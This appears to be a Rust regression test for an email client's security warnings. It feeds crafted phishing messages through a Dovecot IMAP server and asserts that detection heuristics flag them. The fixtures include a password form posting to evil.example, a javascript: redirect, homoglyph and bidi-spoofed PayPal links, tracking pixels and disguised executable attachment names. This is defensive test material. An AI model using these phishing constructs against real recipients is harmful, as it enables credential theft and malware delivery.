//! Real-IMAP regression corpus for every warning class in `spec/security-ui.md`.
//!
//! Some evidence extractors are intentionally still future work. Every case is
//! nevertheless delivered through Dovecot and retained byte-for-byte now, so
//! adding an extractor cannot quietly replace the hostile input with a safer
//! synthetic representation. Assertions become structured as the backend
//! learns each evidence type.

mod support;

use lizard_mail_backend::{
    AccountKind, Backend, BackendConfig, ContactAddress, DkimAuthenticationStatus, FolderKind,
    HeuristicSourceKind, ImapSecurity, ImapSettings, InboxClass, NewAccount, NewContact, NewFolder,
    NewHeuristic,
};
use std::collections::{BTreeMap, BTreeSet};
use support::dovecot::DovecotContainer;

#[derive(Clone, Copy, Debug, Eq, Ord, PartialEq, PartialOrd)]
enum RedFlag {
    ColdContactNameCollision,
    WarmSenderNameMismatch,
    MissingAlignedDkim,
    UnalignedDkim,
    InvalidOpenPgpSignature,
    OpenPgpCiphertextWithoutIntegrity,
    OpenPgpHtmlRemoteContent,
    MisleadingLinkText,
    MisleadingUserInfo,
    RawIpDestination,
    UnusualPort,
    DangerousScheme,
    NestedRedirect,
    UnicodeConfusableDomain,
    AsciiConfusableDomain,
    InvisibleOrBidiDomain,
    CrossDomainAccountAction,
    ReplyToMismatch,
    SenderFromMismatch,
    ConversationInjection,
    AttachmentTypeMismatch,
    DoubleExtension,
    BidiFilename,
    ExecutableAttachment,
    ExecutableInArchive,
    UninspectableArchive,
    RemoteTrackingResource,
    InteractiveCredentialForm,
}

const ALL_RED_FLAGS: &[RedFlag] = &[
    RedFlag::ColdContactNameCollision,
    RedFlag::WarmSenderNameMismatch,
    RedFlag::MissingAlignedDkim,
    RedFlag::UnalignedDkim,
    RedFlag::InvalidOpenPgpSignature,
    RedFlag::OpenPgpCiphertextWithoutIntegrity,
    RedFlag::OpenPgpHtmlRemoteContent,
    RedFlag::MisleadingLinkText,
    RedFlag::MisleadingUserInfo,
    RedFlag::RawIpDestination,
    RedFlag::UnusualPort,
    RedFlag::DangerousScheme,
    RedFlag::NestedRedirect,
    RedFlag::UnicodeConfusableDomain,
    RedFlag::AsciiConfusableDomain,
    RedFlag::InvisibleOrBidiDomain,
    RedFlag::CrossDomainAccountAction,
    RedFlag::ReplyToMismatch,
    RedFlag::SenderFromMismatch,
    RedFlag::ConversationInjection,
    RedFlag::AttachmentTypeMismatch,
    RedFlag::DoubleExtension,
    RedFlag::BidiFilename,
    RedFlag::ExecutableAttachment,
    RedFlag::ExecutableInArchive,
    RedFlag::UninspectableArchive,
    RedFlag::RemoteTrackingResource,
    RedFlag::InteractiveCredentialForm,
];

struct SecurityFixture {
    id: &'static str,
    raw: Vec<u8>,
    red_flags: Vec<RedFlag>,
}

fn message(
    id: &'static str,
    from: &str,
    extra_headers: &str,
    content_type: &str,
    body: &str,
    red_flags: &[RedFlag],
) -> SecurityFixture {
    SecurityFixture {
        id,
        raw: format!(
            concat!(
                "From: {from}\r\n",
                "To: Reader <reader@example.test>\r\n",
                "Date: Mon, 16 Nov 2026 12:00:00 +0000\r\n",
                "Message-ID: <security-{id}@fixture.test>\r\n",
                "Subject: Security fixture {id}\r\n",
                "{extra_headers}",
                "MIME-Version: 1.0\r\n",
                "Content-Type: {content_type}\r\n",
                "\r\n",
                "{body}\r\n"
            ),
            from = from,
            id = id,
            extra_headers = extra_headers,
            content_type = content_type,
            body = body,
        )
        .into_bytes(),
        red_flags: red_flags.to_vec(),
    }
}

fn security_fixtures() -> Vec<SecurityFixture> {
    vec![
        message(
            "cold-name-collision",
            "Frank <stranger@unrelated.example>",
            "",
            "text/plain; charset=utf-8",
            "Hello from Frank.",
            &[RedFlag::ColdContactNameCollision],
        ),
        message(
            "warm-name-change",
            "Chase Bank <frank@example.test>",
            concat!(
                "DKIM-Signature: v=1; a=rsa-sha256; d=mailer.unrelated.example;\r\n",
                "\ts=fixture; h=from:to:subject; bh=invalid; b=invalid\r\n"
            ),
            "text/plain; charset=utf-8",
            "Please review your account.",
            &[RedFlag::WarmSenderNameMismatch, RedFlag::UnalignedDkim],
        ),
        message(
            "missing-aligned-dkim",
            "Security <security@example.com>",
            "",
            "text/plain; charset=utf-8",
            "A deliberately unsigned domain-claim fixture.",
            &[RedFlag::MissingAlignedDkim],
        ),
        message(
            "invalid-openpgp-signature",
            "Signer <signer@example.com>",
            "",
            "multipart/signed; protocol=\"application/pgp-signature\"; boundary=pgp-signature-boundary",
            concat!(
                "--pgp-signature-boundary\r\n",
                "Content-Type: text/plain; charset=utf-8\r\n\r\n",
                "This signed text was modified.\r\n",
                "--pgp-signature-boundary\r\n",
                "Content-Type: application/pgp-signature\r\n\r\n",
                "-----BEGIN PGP SIGNATURE-----\r\ninvalid-fixture\r\n-----END PGP SIGNATURE-----\r\n",
                "--pgp-signature-boundary--"
            ),
            &[RedFlag::InvalidOpenPgpSignature],
        ),
        message(
            "openpgp-efail-boundary",
            "Encrypted <encrypted@example.com>",
            "",
            "multipart/mixed; boundary=efail-boundary",
            concat!(
                "--efail-boundary\r\n",
                "Content-Type: text/html; charset=utf-8\r\n\r\n",
                "<img src=\"https://tracker.evil.example/open-before-decrypt\">\r\n",
                "--efail-boundary\r\n",
                "Content-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=encrypted-boundary\r\n\r\n",
                "--encrypted-boundary\r\nContent-Type: application/pgp-encrypted\r\n\r\nVersion: 1\r\n",
                "--encrypted-boundary\r\nContent-Type: application/octet-stream\r\n\r\n",
                "-----BEGIN PGP MESSAGE-----\r\nno-integrity-packet-fixture\r\n-----END PGP MESSAGE-----\r\n",
                "--encrypted-boundary--\r\n",
                "--efail-boundary--"
            ),
            &[
                RedFlag::OpenPgpCiphertextWithoutIntegrity,
                RedFlag::OpenPgpHtmlRemoteContent,
            ],
        ),
        message(
            "misleading-navigation",
            "Accounts <accounts@example.com>",
            "",
            "text/html; charset=utf-8",
            concat!(
                "<p>Open <a href=\"https://accounts.example.com@evil.example:8443/login?next=https%3A%2F%2Faccounts.example.com\">",
                "accounts.example.com</a>.</p>"
            ),
            &[
                RedFlag::MisleadingLinkText,
                RedFlag::MisleadingUserInfo,
                RedFlag::UnusualPort,
                RedFlag::NestedRedirect,
                RedFlag::CrossDomainAccountAction,
            ],
        ),
        message(
            "active-and-ip-navigation",
            "Portal <portal@example.com>",
            "",
            "text/html; charset=utf-8",
            concat!(
                "<a href=\"http://192.0.2.10/login\">Sign in</a>",
                "<a href=\"javascript:document.location='https://evil.example'\">Continue</a>",
                "<form action=\"https://evil.example/collect\"><input name=\"password\" type=\"password\"></form>"
            ),
            &[
                RedFlag::RawIpDestination,
                RedFlag::DangerousScheme,
                RedFlag::InteractiveCredentialForm,
                RedFlag::CrossDomainAccountAction,
            ],
        ),
        message(
            "confusable-domains",
            "Payments <payments@example.com>",
            "",
            "text/html; charset=utf-8",
            concat!(
                "<a href=\"https://раypal.com/login\">paypal.com</a>",
                "<a href=\"https://paypaI.com/login\">paypal.com</a>",
                "<a href=\"https://paypal.com\u{202e}.evil.example/login\">paypal.com</a>"
            ),
            &[
                RedFlag::UnicodeConfusableDomain,
                RedFlag::AsciiConfusableDomain,
                RedFlag::InvisibleOrBidiDomain,
            ],
        ),
        message(
            "cross-domain-account-action",
            "Example Security <security@example.com>",
            "",
            "text/plain; charset=utf-8",
            "Reset your password and verify your account at https://login.other-example.com/reset",
            &[RedFlag::CrossDomainAccountAction],
        ),
        message(
            "reply-destination",
            "Billing <billing@example.com>",
            concat!(
                "Sender: dispatcher@third-party.example\r\n",
                "Reply-To: Payments <payments@unrelated.example>\r\n"
            ),
            "text/plain; charset=utf-8",
            "Please reply with your confirmation.",
            &[RedFlag::ReplyToMismatch, RedFlag::SenderFromMismatch],
        ),
        message(
            "conversation-injection",
            "Attacker <attacker@unrelated.example>",
            concat!(
                "In-Reply-To: <established-thread@example.test>\r\n",
                "References: <established-thread@example.test>\r\n"
            ),
            "text/plain; charset=utf-8",
            "Re: our established private conversation.",
            &[RedFlag::ConversationInjection],
        ),
        message(
            "executable-attachments",
            "Invoices <invoices@example.com>",
            "",
            "multipart/mixed; boundary=executable-boundary",
            concat!(
                "--executable-boundary\r\nContent-Type: text/plain\r\n\r\nSee attachments.\r\n",
                "--executable-boundary\r\nContent-Type: application/pdf; name=\"invoice.pdf\"\r\n",
                "Content-Disposition: attachment; filename=\"invoice.pdf\"\r\n",
                "Content-Transfer-Encoding: base64\r\n\r\nTVoAAAAA\r\n",
                "--executable-boundary\r\nContent-Type: application/octet-stream; name=\"statement.pdf.exe\"\r\n",
                "Content-Disposition: attachment; filename=\"statement.pdf.exe\"\r\n\r\nprogram\r\n",
                "--executable-boundary\r\nContent-Type: application/octet-stream; name=\"invoice\u{202e}fdp.exe\"\r\n",
                "Content-Disposition: attachment; filename=\"invoice\u{202e}fdp.exe\"\r\n\r\nprogram\r\n",
                "--executable-boundary--"
            ),
            &[
                RedFlag::AttachmentTypeMismatch,
                RedFlag::DoubleExtension,
                RedFlag::BidiFilename,
                RedFlag::ExecutableAttachment,
            ],
        ),
        message(
            "archive-attachments",
            "Archive <archive@example.com>",
            "",
            "multipart/mixed; boundary=archive-boundary",
            concat!(
                "--archive-boundary\r\nContent-Type: text/plain\r\n\r\nTwo archives.\r\n",
                "--archive-boundary\r\nContent-Type: application/zip; name=\"contains-program.zip\"\r\n",
                "Content-Disposition: attachment; filename=\"contains-program.zip\"\r\n",
                "Content-Transfer-Encoding: base64\r\n\r\nUEsDBGV4ZWN1dGFibGUuZXhl\r\n",
                "--archive-boundary\r\nContent-Type: application/zip; name=\"password-protected.zip\"\r\n",
                "Content-Disposition: attachment; filename=\"password-protected.zip\"\r\n",
                "Content-Transfer-Encoding: base64\r\n\r\nUEsDBGVuY3J5cHRlZA==\r\n",
                "--archive-boundary--"
            ),
            &[RedFlag::ExecutableInArchive, RedFlag::UninspectableArchive],
        ),
        message(
            "remote-tracking",
            "Marketing <marketing@example.com>",
            "",
            "text/html; charset=utf-8",
            concat!(
                "<style>body{background:url(https://tracker.example/open-css)}</style>",
                "<img src=\"https://tracker.example/open.gif?recipient=reader\">"
            ),
            &[RedFlag::RemoteTrackingResource],
        ),
    ]
}

fn expected_codes(codes: &[&str]) -> BTreeSet<String> {
    codes.iter().map(|code| (*code).to_owned()).collect()
}

#[tokio::test]
#[ignore = "requires a running Docker daemon and pulls the pinned Dovecot image when absent"]
async fn receives_every_security_warning_fixture_through_dovecot() {
    let fixtures = security_fixtures();
    let covered = fixtures
        .iter()
        .flat_map(|fixture| fixture.red_flags.iter().copied())
        .collect::<BTreeSet<_>>();
    assert_eq!(covered, ALL_RED_FLAGS.iter().copied().collect());

    let dovecot = DovecotContainer::start().await;
    let mut session = dovecot.login().await;
    for fixture in &fixtures {
        session
            .append("INBOX", None, None, &fixture.raw)
            .await
            .unwrap();
    }

    let profile = tempfile::tempdir().unwrap();
    let backend = Backend::open(BackendConfig::new(profile.path()))
        .await
        .unwrap();
    backend
        .contacts()
        .add(NewContact {
            display_name: "Frank".into(),
            addresses: vec![ContactAddress {
                address: "frank@example.test".into(),
                accepted_name: Some("Frank".into()),
            }],
        })
        .await
        .unwrap();
    install_current_security_heuristics(&backend).await;

    let account = backend
        .accounts()
        .add(NewAccount {
            name: "Dovecot security fixtures".into(),
            kind: AccountKind::Imap,
            credential_ref: Some("test-only:dovecot-security".into()),
            imap: Some(ImapSettings {
                host: "127.0.0.1".into(),
                port: dovecot.port,
                username: "reader@example.test".into(),
                security: ImapSecurity::StartTls,
            }),
        })
        .await
        .unwrap();
    let inbox = backend
        .folders()
        .add(NewFolder {
            account_id: Some(account.id),
            name: "Inbox".into(),
            kind: FolderKind::Remote,
            remote_name: Some("INBOX".into()),
        })
        .await
        .unwrap();

    let sync = backend
        .sync()
        .pull_imap_folder(&mut session, account.id, inbox.id)
        .await
        .unwrap();
    assert_eq!(sync.message_ids.len(), fixtures.len());

    let fixtures_by_subject = fixtures
        .iter()
        .map(|fixture| (format!("Security fixture {}", fixture.id), fixture))
        .collect::<BTreeMap<_, _>>();
    let mut messages = BTreeMap::new();
    for message_id in sync.message_ids {
        backend
            .sync()
            .fetch_imap_message_content(&mut session, account.id, message_id)
            .await
            .unwrap();
        let stored = backend.messages().get(message_id).await.unwrap();
        let subject = stored.summary.subject.clone().unwrap();
        let fixture = fixtures_by_subject
            .get(&subject)
            .unwrap_or_else(|| panic!("unexpected Dovecot message {subject:?}"));
        assert_eq!(
            backend.messages().raw(message_id).await.unwrap(),
            fixture.raw
        );
        messages.insert(fixture.id, stored);
    }

    let cold = &messages["cold-name-collision"];
    assert_eq!(cold.summary.inbox_class, InboxClass::Cold);
    assert_eq!(cold.summary.from_name.as_deref(), Some("Frank"));
    let warm = &messages["warm-name-change"];
    assert_eq!(warm.summary.inbox_class, InboxClass::Warm);
    assert_eq!(warm.summary.from_name.as_deref(), Some("Chase Bank"));
    assert_eq!(warm.dkim.status, DkimAuthenticationStatus::Failed);
    assert_eq!(warm.dkim.signatures.len(), 1);
    assert_eq!(
        messages["missing-aligned-dkim"].dkim.status,
        DkimAuthenticationStatus::Unsigned
    );

    let navigation = &messages["misleading-navigation"];
    assert_eq!(
        navigation.links.len(),
        1,
        "stored html: {:?}; stored text: {:?}",
        navigation.body_html,
        navigation.body_text
    );
    assert_eq!(navigation.links[0].host.as_deref(), Some("evil.example"));
    assert!(navigation.links[0]
        .destination
        .contains("accounts.example.com@"));
    assert_eq!(
        navigation
            .findings
            .iter()
            .map(|finding| finding.code.clone())
            .collect::<BTreeSet<_>>(),
        expected_codes(&[
            "cross_domain_account_action",
            "misleading_userinfo",
            "nested_redirect",
            "unusual_port",
        ])
    );

    let active = &messages["active-and-ip-navigation"];
    assert!(active
        .links
        .iter()
        .any(|link| link.host.as_deref() == Some("192.0.2.10")));
    assert!(active.links.iter().any(|link| link.scheme == "javascript"));
    assert_eq!(
        active
            .findings
            .iter()
            .map(|finding| finding.code.clone())
            .collect::<BTreeSet<_>>(),
        expected_codes(&[
            "cross_domain_account_action",
            "dangerous_scheme",
            "raw_ip_destination",
        ])
    );

    let confusable = &messages["confusable-domains"];
    assert!(confusable.links.iter().any(|link| {
        link.host
            .as_deref()
            .is_some_and(|host| host.starts_with("xn--"))
    }));
    assert!(confusable
        .links
        .iter()
        .any(|link| link.destination.contains("paypaI.com")));

    let account_action = &messages["cross-domain-account-action"];
    assert_eq!(
        account_action
            .findings
            .iter()
            .map(|finding| finding.code.clone())
            .collect::<BTreeSet<_>>(),
        expected_codes(&["cross_domain_account_action"])
    );

    let attachments = &messages["executable-attachments"];
    assert_eq!(attachments.attachments.len(), 3);
    assert!(attachments
        .attachments
        .iter()
        .any(|attachment| attachment.name.as_deref() == Some("invoice.pdf")));
    assert_eq!(
        attachments
            .findings
            .iter()
            .map(|finding| finding.code.clone())
            .collect::<BTreeSet<_>>(),
        expected_codes(&["bidi_filename", "double_extension"])
    );

    session.logout().await.unwrap();
}

async fn install_current_security_heuristics(backend: &Backend) {
    let heuristics = [
        (
            "Cross-domain account action",
            r#"
@heuristic
def detect(message):
    body = message.body_text.lower()
    if not (body.contains("password") or body.contains("reset") or body.contains("account") or body.contains("sign in") or body.contains("login") or body.contains("verify")):
        return
    for link in message.links:
        if link.registrable_domain != message.sender.registrable_domain:
            yield Finding(
                code="cross_domain_account_action",
                presentation=LinkInterstitial,
                severity=Danger,
                target=link.id,
                evidence={"destination": link.destination},
            )
"#,
        ),
        (
            "Navigation boundaries",
            r#"
@heuristic
def detect(message):
    for link in message.links:
        if link.destination.contains("@"):
            yield Finding(code="misleading_userinfo", presentation=LinkInterstitial, severity=Danger, target=link.id, evidence={"destination": link.destination})
        if link.host == "192.0.2.10":
            yield Finding(code="raw_ip_destination", presentation=LinkInterstitial, severity=Warning, target=link.id, evidence={"host": link.host})
        if link.destination.contains(":8443"):
            yield Finding(code="unusual_port", presentation=LinkInterstitial, severity=Warning, target=link.id, evidence={"destination": link.destination})
        if link.scheme == "javascript":
            yield Finding(code="dangerous_scheme", presentation=LinkInterstitial, severity=Danger, target=link.id, evidence={"scheme": link.scheme})
        if link.destination.contains("next="):
            yield Finding(code="nested_redirect", presentation=LinkInterstitial, severity=Warning, target=link.id, evidence={"destination": link.destination})
"#,
        ),
        (
            "Filename hazards",
            concat!(
                r#"
@heuristic
def detect(message):
    for attachment in message.attachments:
        if attachment.name.ends_with(".pdf.exe"):
            yield Finding(code="double_extension", presentation=AttachmentInterstitial, severity=Danger, target=attachment.id, evidence={"name": attachment.name})
        if attachment.name.contains(""#,
                "\u{202e}",
                r#""):
            yield Finding(code="bidi_filename", presentation=AttachmentInterstitial, severity=Danger, target=attachment.id, evidence={"name": attachment.name})
"#
            ),
        ),
    ];
    for (name, source) in heuristics {
        backend
            .heuristics()
            .add(NewHeuristic {
                name: name.into(),
                source: source.into(),
                source_kind: HeuristicSourceKind::BuiltIn,
                enabled: true,
            })
            .await
            .unwrap();
    }
}
